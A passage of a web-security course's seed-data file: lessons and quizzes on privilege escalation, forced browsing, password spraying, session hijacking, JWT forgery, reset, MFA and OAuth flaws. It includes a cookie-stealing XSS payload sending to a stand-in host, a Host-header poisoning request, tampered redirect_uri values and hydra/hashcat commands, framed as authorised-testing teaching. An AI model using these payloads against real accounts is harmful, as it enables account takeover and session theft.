              'Impact is close to the maximum a web app can suffer: a self-service jump to admin means full control - reading and deleting other users\' data, changing anyone\'s account, often reaching internal tooling. In a report, state the starting privilege (an ordinary registered user), the ending privilege (admin), the exact field you tampered, and one concrete admin action you were then able to perform, so the severity is undeniable.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Diff two accounts',
            text:
              'Capture the same action as a normal user and as an admin. The fields that differ are exactly the ones worth tampering.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only attempt privilege escalation on systems you own or are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can spot a client-controlled privilege value and test whether the server foolishly trusts it.',
          },
          {
            type: 'quiz',
            question: 'You add "role":"admin" to a profile-update request and become an admin. What went wrong?',
            options: [
              'The password was too weak',
              'The server trusted a client-supplied field instead of enforcing the role server-side',
              'The site was missing HTTPS',
              'The session cookie expired',
            ],
            correctIndex: 1,
            explanation:
              'Mass assignment: the server saved a privileged field straight from the request. Roles must be enforced server-side, never taken from client input.',
          },
        ],
      },
      {
        slug: 'forced-browsing',
        title: 'Forced Browsing and Hidden Admin',
        summary: 'The admin page is often right there - just not linked. Guess the URL and see if the server actually stops you.',
        estimatedMinutes: 8,
        importance: 'core',
        blocks: [
          videoSlot('Forced browsing - the admin panel nobody linked but nobody protected'),
          {
            type: 'paragraph',
            text:
              'Forced browsing is reaching pages and files by requesting their URLs directly, even though nothing on the site links to them. Developers routinely hide an admin panel simply by leaving it out of the menu, which is "security by obscurity" - and obscurity is not access control. If the server does not check your permissions when you visit that URL directly, hiding the link protected nothing.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Guess the obvious** - `/admin`, `/dashboard`, `/backup`, `/config`, `/.git/`',
              '**Fuzz with a wordlist** - tools like ffuf or gobuster try thousands of paths fast',
              '**Follow patterns** - if `/report/2024` exists, try `/report/2023` and `/admin/report`',
              '**Look for leftovers** - `/old/`, `/test/`, `.bak` files, exposed `.env`',
            ],
          },
          {
            type: 'command',
            description: 'Fuzz for hidden paths on a target you are authorised to test:',
            commands: [
              'ffuf -u https://target.example/FUZZ -w wordlist.txt',
              'gobuster dir -u https://target.example -w wordlist.txt',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Read the output like a hunter, not a collector. ffuf and gobuster print each path they tried alongside its HTTP status and response size. A `200` is interesting - the page exists and returned content. A `301`/`302` redirect often means the page exists but bounces you to a login, which is usually the control working. A `403` means the path exists but is forbidden, and a `404` means nothing is there. So you skim past the `404`s, note the `200`s, and treat a `200` on something like `/admin` as a lead - not yet a finding. The tools give you candidates; you still have to test each one by hand.',
          },
          {
            type: 'paragraph',
            text:
              'That distinction is the whole lesson. Finding `/admin` is not the bug - the bug is that the server *served you the admin dashboard* while you were logged in as a nobody. Confirm it properly: visit the discovered URL with your ordinary account and check whether you get the real, functional admin content, or a redirect to login / a `403`. A page that redirects you away is behaving correctly; a page that renders the user-management table for your normal account is broken access control. The impact you report is what you could actually reach and do there - view all users, trigger admin actions - because a found-but-protected path is worth nothing and a found-and-open admin panel can be critical.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Found is not the same as broken',
            text:
              'Discovering a hidden path only matters if access control is missing behind it. Always confirm you can actually do the privileged thing.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only fuzz and force-browse systems you own or are authorised to test - aggressive fuzzing is noisy and unauthorised scanning is an offence.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You can hunt for unlinked pages and, more importantly, confirm whether the server actually protects them.',
          },
          {
            type: 'practice_ref', title: 'Broken Access Control check', exerciseSlug: 'broken-access-control-quiz',
          },
          {
            type: 'quiz',
            question: 'You find /admin by guessing the URL, and it loads the full admin panel for your normal account. What is the real vulnerability?',
            options: [
              'That the page was not linked in the menu',
              'That the server served an admin-only page without checking your privileges',
              'That you used a wordlist to find it',
              'That the URL was easy to guess',
            ],
            correctIndex: 1,
            explanation:
              'Not linking a page is not protection. The flaw is missing server-side access control on the page, so any user who reaches it gets in.',
          },
        ],
      },
    ],
  },
  {
    slug: 'auth-and-session-attacks',
    title: 'Auth and Session Attacks',
    description: 'Account takeover, taken apart step by step: guessing credentials at scale, stealing or planting session tokens, forging identity in a JWT, and abusing the two flows almost every site gets wrong - password reset and MFA. By the end you can test each weakness against a target you own and say exactly what would let you into someone else\'s account.',
    lessons: [
      {
        slug: 'password-attacks-and-brute-force',
        title: 'Password Attacks',
        summary: 'Guessing at scale still works, because people reuse weak passwords and sites forget to slow attackers down.',
        estimatedMinutes: 8,
        importance: 'core',
        blocks: [
          videoSlot('Password attacks - brute force, spraying and stuffing, explained'),
          {
            type: 'paragraph',
            text:
              'Passwords are still the front door of most apps, and people pick predictable ones. Password attacks are about guessing at scale, and they keep working for one reason: too many sites do not slow the guesser down with rate limits, lockouts, or a second factor. The whole game is submitting many login attempts and reading the responses for the one that succeeds.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Brute force** - try many passwords against one account',
              '**Dictionary attack** - try a wordlist of likely passwords, not random ones',
              '**Password spraying** - try one common password across many accounts (dodges lockouts)',
              '**Credential stuffing** - reuse username/password pairs leaked from other breaches',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Spraying and stuffing are the two that work in the real world. Spraying flips the usual logic: instead of a thousand passwords against one user (which trips a lockout after five tries), you try *one* common password like `Welcome@123` against a thousand users, so no single account sees more than one failed attempt. Stuffing bets on reuse - it replays username/password pairs that already leaked in some other site\'s breach, because people reuse passwords everywhere.',
          },
          {
            type: 'command',
            description: 'Concept of an authorised login test (only against a target you own or are authorised to test). This posts each password from the list to the login form and reports which one the server accepts:',
            commands: ['hydra -l admin -P wordlist.txt target.example http-post-form'],
          },
          {
            type: 'paragraph',
            text:
              'Reading the result is the skill, and it is all about telling a success from a failure by the *response*, not the status code - a wrong login and a right one often both return `200`. You watch three things: a change in the response body (an error message vanishes, or a "welcome" appears), a change in length (the success page is a different size), and a redirect (`302` to a dashboard). hydra automates exactly this comparison and prints the credential where the response broke the failure pattern. A false positive here is a server that returns the *same* response for valid and invalid logins - then hydra "finds" everything or nothing, and you have learned the app is not leaking a success signal.',
          },
          {
            type: 'paragraph',
            text:
              'Before you even guess a password, the login can leak which usernames exist. If `wronguser` returns "no such account" and `realuser` returns "wrong password", the app just told you which names are real - user enumeration. The same leak shows up in different response times or status codes. In a report, note whether the login rate-limits, whether it locks accounts, whether it enumerates users, and whether it offers MFA - those four together decide how exposed the login is, and "no rate limit plus user enumeration" is a genuine finding on its own.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Watch the responses',
            text:
              'A different error, a different status code, or a different response time for a valid vs invalid username leaks which accounts exist - useful before you even guess a password.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only run password attacks against systems you own or are authorised to test. Guessing credentials on someone else\'s login is unauthorised access.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can tell brute force, spraying and stuffing apart and name the defences that stop them.',
          },
          {
            type: 'quiz',
            question: 'Password spraying differs from brute force because it...',
            options: [
              'Tries thousands of passwords against one account',
              'Tries one common password across many accounts to avoid per-account lockouts',
              'Only works with leaked password databases',
              'Requires the admin password',
            ],
            correctIndex: 1,
            explanation:
              'Spraying tries a single common password across many users, staying under lockout thresholds that would trip a single-account brute force.',
          },
        ],
      },
      {
        slug: 'session-hijacking-and-fixation',
        title: 'Session Hijacking and Fixation',
        summary: 'Steal the session token and you are logged in as them - no password needed. Or hand them a token you already know.',
        estimatedMinutes: 9,
        importance: 'essential',
        blocks: [
          videoSlot('Session hijacking and fixation - being someone without their password'),
          {
            type: 'paragraph',
            text:
              'After you log in, the site hands your browser a session token - almost always a cookie - and from then on it trusts that token on every request instead of asking for your password again. That is the weak point: the token *is* your logged-in identity. Steal it and you are that user, no password required. That is session hijacking, and it is why a session cookie is as sensitive as a password.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'Hijacking: steal the token',
          },
          {
            type: 'paragraph',
            text:
              'Walk one route end to end. Say the site sets its session cookie without the HttpOnly flag, and it also has a stored XSS bug. You plant a payload that runs `new Image().src = "https://you.example/c?" + document.cookie` in a victim\'s browser. When they load the page, their browser quietly requests that URL, and your server log now shows a line like `GET /c?session=8f3a...` - their live session token. You paste that token into your own browser\'s cookie for the site, reload, and you are logged in as them. You confirm it is real by loading a page only that user should see (their account settings) and seeing their data, not yours.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Via XSS** - `document.cookie` read and sent to an attacker (only works if the cookie is NOT HttpOnly)',
              '**Over plain HTTP** - a cookie without the Secure flag can be sniffed on an open network',
              '**From logs or URLs** - session ids that leak into server logs, Referer headers, or shared links',
            ],
          },
          {
            type: 'heading',
            level: 3,
            text: 'Fixation: plant the token',
          },
          {
            type: 'paragraph',
            text:
              'Session fixation flips the direction: instead of stealing the victim\'s token afterward, you give them a token you already know *before* they log in. You obtain a valid session id from the site, trick the victim into using it (a crafted link that sets the cookie), and wait for them to log in. If the app is broken, it authenticates that same session id instead of issuing a fresh one at login - so the id you already know is now attached to their authenticated session, and you ride it. The tell during testing: note your session id, log in, and check whether the id *changed*. If it is identical before and after login, the app is vulnerable to fixation. If a brand-new id appears at login, it is safe.',
          },
          {
            type: 'paragraph',
            text:
              'Impact for both is the same headline - full account takeover without the password - but the reporting differs. For hijacking you state the theft route (missing HttpOnly plus XSS, or a missing Secure flag on an open network) and prove you reached the account with the stolen token. For fixation you show the session id surviving login unchanged and explain that any attacker who can pre-set a cookie can therefore takeover. The defences you would recommend are concrete: mark cookies HttpOnly and Secure, add SameSite, and regenerate the session id at login and at any privilege change.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'The fix for fixation',
            text:
              'Always regenerate the session id at login (and at privilege change). A token that existed before authentication should never be valid after it.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only test session attacks on systems you own or are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can explain how a stolen or pre-planted session token becomes account access, and how HttpOnly, Secure, and id regeneration stop it.',
          },
          {
            type: 'quiz',
            question: 'Which cookie flag most directly stops an XSS payload from stealing a session cookie?',
            options: ['Secure', 'HttpOnly', 'SameSite', 'Path'],
            correctIndex: 1,
            explanation:
              'HttpOnly hides the cookie from JavaScript, so document.cookie cannot read it. Secure and SameSite defend against other risks.',
          },
        ],
      },
      {
        slug: 'jwt-attacks',
        title: 'JWT Attacks',
        summary: 'A JWT is readable, and if the server checks its signature lazily, you can rewrite the part that says who you are.',
        estimatedMinutes: 10,
        importance: 'essential',
        blocks: [
          videoSlot('JWT attacks - none algorithm, weak secrets, and readable tokens'),
          {
            type: 'image',
            src: '/api/v1/diagrams/jwt-anatomy',
            alt: 'A JWT split into header, payload and signature with decoded contents',
            caption: 'Attack the header and the signature check, not the base64.',
          },
          {
            type: 'paragraph',
            text:
              'A JWT (JSON Web Token) is three base64 chunks joined by dots: a header, a payload, and a signature. The diagram above splits one apart. The header says how the token is signed, the payload carries your identity and role, and the signature is a stamp proving the server made it. The crucial thing to understand is that base64 is *not encryption* - it is just encoding. Anyone can decode and read the payload. The only thing stopping you from editing your own token is the signature check, so every JWT attack is really an attack on that check.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'decoded-payload',
            code: 'header:  {"alg":"HS256","typ":"JWT"}\npayload: {"sub":"asha","role":"user"}   <-- change user to admin if you can defeat the signature',
          },
          {
            type: 'heading',
            level: 3,
            text: 'The classic weaknesses',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**alg: none** - set the algorithm to `none` and drop the signature; a broken server accepts it',
              '**Weak HMAC secret** - if signed with HS256 and a guessable secret, crack it offline and re-sign',
              '**alg confusion** - swap RS256 for HS256 and sign with the public key as the secret',
              '**No expiry check** - a token that never expires stays valid forever',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Walk the weak-secret attack, because it is the most common real finding. You capture your own token, decode the payload, and see `"role":"user"`. The header says `HS256`, which means the signature is an HMAC using one shared secret. If the developer used a lazy secret like `secret` or `password`, you can crack it offline with no requests to the server at all - the command below feeds the token and a wordlist to hashcat.',
          },
          {
            type: 'command',
            description: 'Try cracking a weak HMAC secret on a token from a target you are authorised to test:',
            commands: ['hashcat -m 16500 token.jwt wordlist.txt'],
          },
          {
            type: 'paragraph',
            text:
              'When hashcat prints `token.jwt:secretkey`, it has recovered the signing secret - that is the whole ballgame. Now you decode your token, change `"role":"user"` to `"role":"admin"`, re-sign it with the cracked secret, and replay the request with the new token. Here is the confirmation discipline: sending the forged token and getting a `200` is *not* proof by itself. You must show the token now grants admin - reach an admin-only endpoint that returned `403` with your original token and returns real admin data with the forged one. If the server rejects your forged token with `401`, either the secret was wrong or the server checks something else, and you do not have the bug. A separate quick test is the `alg:none` trick: set the header algorithm to `none`, strip the signature entirely, and see if a badly-built server accepts an unsigned token - if it does, you can forge any claim with no secret at all.',
          },
          {
            type: 'paragraph',
            text:
              'Impact is identity forgery, which is about as severe as it gets: you can become any user, including admin, by editing a field. In a report, state which weakness you used (cracked HS256 secret, `alg:none`, or algorithm confusion), show the original token\'s claims versus the forged claims, and prove the elevated access with one concrete action the forged token unlocked. The fix you recommend: a strong random secret (or proper asymmetric keys), a pinned expected algorithm so `none` and confusion are rejected, and a real expiry check.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Never trust the payload blindly',
            text:
              'A server must verify the signature with a strong, secret key and pin the expected algorithm. Reading the payload without a real signature check is the whole bug.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only tamper with and crack tokens issued to you by systems you own or are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can decode a JWT, spot a forgeable claim, and name the alg:none and weak-secret attacks.',
          },
          {
            type: 'quiz',
            question: 'A server accepts a JWT with its algorithm set to "none" and no signature. Why is that dangerous?',
            options: [
              'The token loads slower',
              'Anyone can edit the payload (like role) and the server accepts it without a valid signature',
              'It exposes the user\'s password',
              'It disables HTTPS',
            ],
            correctIndex: 1,
            explanation:
              'With alg:none the signature check is skipped, so an attacker can rewrite claims such as role and be trusted as anyone.',
          },
        ],
      },
      {
        slug: 'password-reset-flaws',
        title: 'Password Reset Flaws',
        summary: 'The "forgot password" flow is a second login you can attack - and it is often weaker than the first.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          videoSlot('Password reset flaws - the weakest door into any account'),
          {
            type: 'paragraph',
            text:
              'The password reset flow can hand over an account without knowing the old password, which makes it a second, often weaker login - and attackers love it precisely because it gets less scrutiny than the main sign-in page. If you can predict the reset token, redirect where it is sent, or reuse an old one, you own the account.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Predictable tokens** - short, sequential, or timestamp-based reset codes you can guess',
              '**Token leakage** - the reset link leaking via the Referer header to third-party scripts',
              '**Host header poisoning** - the reset email built from a Host header you control, sending the link to your server',
              '**No expiry or single-use** - an old reset link that still works, or works twice',
              '**Account takeover via email/param tampering** - changing an `email` or `user` field in the reset request',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Walk the host-header attack, the most famous one. When you request a reset, the server has to build an absolute link to email you - `https://SITE/reset?token=...` - and lazy code builds that `SITE` part from the incoming `Host` header instead of a trusted config value. So you intercept the reset request in Burp and change the Host header to a domain you control, as below.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'host-header-tamper',
            code: 'POST /forgot-password\nHost: attacker.example        <-- reset link may be built from this\nContent-Type: application/x-www-form-urlencoded\n\nemail=victim@example.com',
          },
          {
            type: 'paragraph',
            text:
              'You send this asking to reset the *victim\'s* email, but with your Host. If the app is vulnerable, the victim receives a genuine reset email whose link points at `https://attacker.example/reset?token=SECRET`. The moment they click it, your server logs the token, and you use it on the real site to set a new password on their account. Confirming it without a real victim: request a reset for an account *you* own with the tampered Host, then read the email you receive and check the link\'s domain. If it shows `attacker.example`, the token is being built from the header and the bug is proven - no need to phish anyone. If the link still shows the real site domain, the app used a trusted value and there is no host-header bug.',
          },
          {
            type: 'paragraph',
            text:
              'For the other flaws, the test is to poke at the token itself: request a reset and inspect the token for length and randomness (a 4-digit code is guessable, a 40-char random string is not), then try using it twice, using it an hour later, and using one account\'s token on another account. Impact for any of these is full account takeover, so a report should name the specific flaw (attacker-controlled Host, guessable token, no single-use), show the proof step you ran on your own account, and recommend a long random single-use token that expires quickly, tied to the account, with the link built from a server-side trusted host.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Test the token itself',
            text:
              'Request a reset, then check: is the token long and random? Does it expire? Does it still work after use? Can you use one account\'s token on another?',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only test reset flows on accounts and systems you own or are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can pick apart a password reset flow and name the flaws that turn it into account takeover.',
          },
          {
            type: 'quiz',
            question: 'Why is a Host header used to build a password reset link dangerous?',
            options: [
              'It makes the email load slower',
              'An attacker can set the Host to their own domain, so the reset link points to a server they control',
              'It reveals the user\'s password in the email',
              'It disables the token entirely',
            ],
            correctIndex: 1,
            explanation:
              'If the reset link is built from an attacker-controlled Host header, the victim\'s reset token can be delivered to the attacker\'s server.',
          },
        ],
      },
      {
        slug: 'mfa-bypass',
        title: 'MFA Bypass',
        summary: 'A second factor is only as strong as how it is checked. Skip the step, brute the code, or replay the flow.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          videoSlot('MFA bypass - when the second factor is not really enforced'),
          {
            type: 'paragraph',
            text:
              'Multi-factor auth adds a second check on top of the password - an OTP over SMS, a code from an authenticator app, a push notification. It is a genuinely strong defence *when the server enforces it correctly*. The bugs come from implementations that treat the second factor as a UI step rather than a real gate, so you can skip it, brute-force it, or tamper the response that says you passed it.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Skipping the step** - go straight to a post-login URL; if the server issued a session before MFA, you are in',
              '**No rate limit on the OTP** - a 6-digit code with unlimited tries is brute-forceable',
              '**Response tampering** - flip `"mfa":false` or a `verified:true` field in the response or a follow-up request',
              '**Reusing or leaking codes** - an OTP that stays valid too long, or is reflected back to the client',
              '**Backup-code weakness** - weak or unlimited recovery codes that dodge the real factor',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Walk the step-skip test, which is the most common real bypass and needs no tools. You submit your correct username and password, and the app shows the "enter your code" page. Instead of entering the code, you simply navigate straight to an authenticated page as if MFA had already passed - the request below.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'step-skip-test',
            code: 'Step 1: POST /login  (correct username + password)  -> 200, shows OTP page\nStep 2: GET /account/dashboard   <-- request this directly, WITHOUT the OTP\n\nVulnerable  -> 200, the real dashboard loads\nSafe        -> 302 back to the OTP page, or 401/403',
          },
          {
            type: 'paragraph',
            text:
              'The result tells you everything. If `GET /account/dashboard` returns the real dashboard content, the server handed you a fully authenticated session after the *password* step and only *displays* the OTP page as decoration - the MFA is bypassed. If instead you get bounced back to the OTP page or a `401`, the session is genuinely gated on the second factor and there is no bug. The false positive to avoid: a page that loads but shows an empty or "please verify" state is not a bypass - you need real authenticated data to prove you are in. A second quick test is brute force: if the OTP is six digits and the server never rate-limits or locks after wrong codes, a script can walk all million combinations, so note how many wrong attempts it takes before you are blocked.',
          },
          {
            type: 'paragraph',
            text:
              'Impact is that MFA - the control users trust most - provides no protection, so any attacker with the password alone gets in, which downgrades a "strong" account to a password-only one. In a report, state which bypass you used, show the exact request that reached authenticated content without the code (or the number of unlimited OTP attempts), and recommend the fix: the session must stay unauthenticated until the second factor is verified server-side, and the OTP endpoint must be rate-limited.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Rate limit the code',
            text:
              'A short numeric OTP with no attempt limit is not a second factor - it is a speed bump. Enforcement and rate limiting are what make MFA real.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only test MFA flows on accounts and systems you own or are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You can probe an MFA flow for step-skipping, missing rate limits, and tamperable verification.',
          },
          {
            type: 'quiz',
            question: 'After the password step, you browse straight to the dashboard URL and it loads without entering the OTP. What is the flaw?',
            options: [
              'The OTP was too short',
              'The server granted an authenticated session before the second factor was verified',
              'The email was not confirmed',
              'The password was weak',
            ],
            correctIndex: 1,
            explanation:
              'MFA must gate the session. If authenticated pages work before the code is checked, the second factor is not actually enforced.',
          },
        ],
      },
      {
        slug: 'oauth-misconfigurations',
        title: 'OAuth Misconfigurations',
        summary: '"Login with Google" is convenient - and full of sharp edges when redirect URIs and state are handled sloppily.',
        estimatedMinutes: 9,
        importance: 'optional',
        blocks: [
          {
            type: 'paragraph',
            text:
              'OAuth powers "Login with Google/GitHub". It is a token dance between three parties: the app you are logging into, the provider (Google), and your browser passing messages between them. The app sends you to the provider, you approve, and the provider sends you back to the app with a secret code that the app swaps for your identity. When the app validates *where* it sends you back loosely, or skips the anti-forgery check, that dance leaks the code or forges a login.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Open redirect_uri** - if the provider accepts a redirect to a domain you control, the auth code lands on your server',
              '**Missing state parameter** - no state means no CSRF protection on the login, enabling login CSRF',
              '**Weak redirect matching** - `redirect_uri` validated by prefix or substring, bypassed with a lookalike path',
              '**Token leakage** - access tokens in the URL fragment leaking via Referer or history',
              '**Account linking abuse** - linking your OAuth identity to a victim\'s existing account',
            ],
          },
          {
            type: 'paragraph',
            text:
              'The high-value target is the `redirect_uri` - the address the provider sends the secret code back to. The app is supposed to allow only its own exact callback URL. You test how strictly it checks by tampering that parameter in the authorization request, as below.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'redirect-tamper',
            code: 'Legit:  GET /authorize?client_id=...&redirect_uri=https://app.example/callback\nEvil:   GET /authorize?client_id=...&redirect_uri=https://app.example.attacker.example/callback\nEvil2:  GET /authorize?client_id=...&redirect_uri=https://app.example/callback/../../evil',
          },
          {
            type: 'paragraph',
            text:
              'Read the provider\'s response to each. If it rejects the tampered `redirect_uri` with an error like "redirect_uri mismatch", the check is strict and safe - no bug. If it *accepts* a lookalike domain (`app.example.attacker.example` is a domain the attacker owns, not the real app) or a path-traversal trick and sends the authorization code there, then an attacker who lures a logged-in victim through that crafted authorize link receives the victim\'s code and completes the login as them. The confirmation that it is real: you must see the provider actually redirect to, or accept, your attacker-controlled destination carrying the `code` parameter. A provider that bounces every altered value back with an error is behaving correctly, and a redirect that still goes only to the real callback is not a finding.',
          },
          {
            type: 'paragraph',
            text:
              'The `state` parameter is the other thing to check: it ties the provider\'s response back to the specific request that started the flow, which is what stops a cross-site request from completing a login you did not begin. If the app omits `state` or never verifies it, the login is open to CSRF - an attacker can force a victim\'s browser to complete a login the attacker initiated, often linking the victim\'s session to the attacker\'s account. Impact for the redirect flaw is account takeover (you log in as the victim); for missing state it is login CSRF. In a report, name the exact parameter, show the tampered request the provider accepted, and recommend exact-match redirect validation plus a verified `state` on every flow.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'state is not optional',
            text:
              'The `state` parameter ties the response back to the request that started it. Missing or unverified state is a CSRF hole in the login itself.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only test OAuth flows on applications you own or are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can name the redirect_uri and state flaws that turn a convenient social login into account takeover.',
          },
          {
            type: 'quiz',
            question: 'Why is loose validation of the OAuth redirect_uri dangerous?',
            options: [
              'It makes login slower',
              'An attacker can redirect the auth code or token to a domain they control and complete the login as the victim',
              'It exposes the OAuth provider\'s source code',
              'It disables HTTPS on the callback',
            ],
            correctIndex: 1,
            explanation:
              'If the app accepts an attacker-controlled redirect_uri, the authorization code or token is delivered to the attacker, leading to account takeover. Redirect URIs must be matched exactly.',
          },
        ],
      },
    ],
  },
];

export const EXERCISES: ExerciseSeed[] = [
  {
    lessonSlug: 'csp-and-xss-defense',
    slug: 'xss-quiz',
    title: 'Cross-Site Scripting check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'What does an XSS bug let an attacker do?',
        options: [
          'Read arbitrary files on the server',
          'Run their own JavaScript in another user\'s browser',
          'Drop the database',
          'Bypass the firewall',
        ],
        correctIndex: 1,
        explanation: 'XSS runs attacker-controlled JavaScript in a victim\'s browser with that user\'s trust and session.',
      },
      {
        prompt: 'Which type of XSS is saved on the server and served to every visitor?',
        options: ['Reflected', 'Stored', 'DOM-based', 'Blind only'],
        correctIndex: 1,
        explanation: 'Stored XSS is persisted and runs for anyone who loads the affected page, no click needed.',
      },
      {
        prompt: 'DOM XSS is caused by...',
        options: [
          'The server echoing input into HTML',
          'Client-side JavaScript writing a source into a dangerous sink like innerHTML',
          'A weak database password',
          'A missing HTTPS certificate',
        ],
        correctIndex: 1,
        explanation: 'DOM XSS happens entirely in the browser when JS moves attacker input into a sink such as innerHTML.',
      },
      {
        prompt: 'A filter blocks the word "script". Which payload still runs JavaScript?',
        options: [
          '<script>alert(1)</script>',
          '<img src=x onerror=alert(1)>',
          'plain text with no tags',
          'alert(1) typed alone',
        ],
        correctIndex: 1,
        explanation: 'Event handlers like onerror execute JavaScript with no <script> tag, so a word blocklist misses them.',
      },
      {
        prompt: 'What is the primary correct defence against XSS?',
        options: [
          'Blocking the word script',
          'Context-aware output encoding, with CSP as a safety net',
          'A longer password policy',
          'Turning off cookies',
        ],
        correctIndex: 1,
        explanation: 'Encoding output for its context stops input being run as code. CSP is a valuable second layer, not the main fix.',
      },
    ],
  },
  {
    lessonSlug: 'forced-browsing',
    slug: 'broken-access-control-quiz',
    title: 'Broken Access Control check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'What is the difference between authentication and access control?',
        options: [
          'They are the same thing',
          'Authentication proves who you are; access control decides what you may do',
          'Access control happens before login',
          'Authentication is only for admins',
        ],
        correctIndex: 1,
        explanation: 'Login proves identity. Access control is the separate check on what that identity is allowed to touch.',
      },
      {
        prompt: 'You change invoiceId=1024 to 1025 and see another user\'s invoice. This is...',
        options: ['XSS', 'IDOR', 'A brute-force attack', 'Path traversal'],
        correctIndex: 1,
        explanation: 'IDOR: the server trusts the supplied id without checking the object belongs to you.',
      },
      {
        prompt: 'What does ../ achieve in a path traversal attack?',
        options: [
          'Encrypts the file',
          'Moves up a directory to escape the intended folder',
          'Deletes a directory',
          'Renames a file',
        ],
        correctIndex: 1,
        explanation: '../ climbs up one folder; chaining it escapes the allowed directory to reach other files.',
      },
      {
        prompt: 'A profile update accepts "role":"admin" and you become admin. What is this?',
        options: [
          'Session fixation',
          'Mass-assignment privilege escalation - the server trusted a client field',
          'An open redirect',
          'A DNS bug',
        ],
        correctIndex: 1,
        explanation: 'The server saved a privileged field from the request. Roles must be enforced server-side, never taken from client input.',
      },
      {
        prompt: 'You guess /admin and it loads the admin panel for your normal account. The real bug is...',
        options: [
          'That the page was not in the menu',
          'That the server served an admin-only page without checking your privileges',
          'That you guessed the URL',
          'That the URL was short',
        ],
        correctIndex: 1,
        explanation: 'Hiding a page is not protection. The flaw is missing server-side access control behind the URL.',
      },
    ],
  },
  {
    lessonSlug: 'oauth-misconfigurations',
    slug: 'auth-and-session-attacks-quiz',
    title: 'Auth and Session Attacks check',
    instructions: 'Six quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'Password spraying is best described as...',
        options: [
          'Trying thousands of passwords against one account',
          'Trying one common password across many accounts to dodge lockouts',
          'Cracking a password hash offline',
          'Guessing a reset token',
        ],
        correctIndex: 1,
        explanation: 'Spraying uses one common password across many users, staying under per-account lockout limits.',
      },
      {
        prompt: 'Which cookie flag stops JavaScript (and thus XSS) from reading a session cookie?',
        options: ['Secure', 'HttpOnly', 'SameSite', 'Domain'],
        correctIndex: 1,
        explanation: 'HttpOnly hides the cookie from document.cookie, blocking script-based theft.',
      },
      {
        prompt: 'A server accepts a JWT with alg set to "none". Why is that bad?',
        options: [
          'The token loads slower',
          'The signature is skipped, so an attacker can edit claims like role and be trusted',
          'It leaks the user\'s password',
          'It disables HTTPS',
        ],
        correctIndex: 1,
        explanation: 'alg:none means no signature check, so claims can be forged freely.',
      },
      {
        prompt: 'Why is an attacker-controlled Host header in a password reset dangerous?',
        options: [
          'It slows the email',
          'The reset link can be built from it and delivered to the attacker\'s server',
          'It changes the user\'s password directly',
          'It reveals the database schema',
        ],
        correctIndex: 1,
        explanation: 'If the reset link uses a client-supplied Host, the victim\'s reset token can land on the attacker\'s domain.',
      },
      {
        prompt: 'You reach an authenticated dashboard before submitting the OTP. The MFA flaw is...',
        options: [
          'The OTP was too short',
          'The session was granted before the second factor was verified',
          'The email was unverified',
          'The password was reused',
        ],
        correctIndex: 1,
        explanation: 'MFA must gate the session. Authenticated pages working before the code is checked means it is not enforced.',
      },
      {
        prompt: 'Why must an OAuth redirect_uri be matched exactly?',
        options: [
          'To speed up login',
          'Loose matching lets an attacker send the auth code or token to a domain they control',
          'To hide the client secret',
          'To enable HTTPS',
        ],
        correctIndex: 1,
        explanation: 'An attacker-controlled redirect_uri delivers the code or token to the attacker, causing account takeover.',
      },
    ],
  },
];
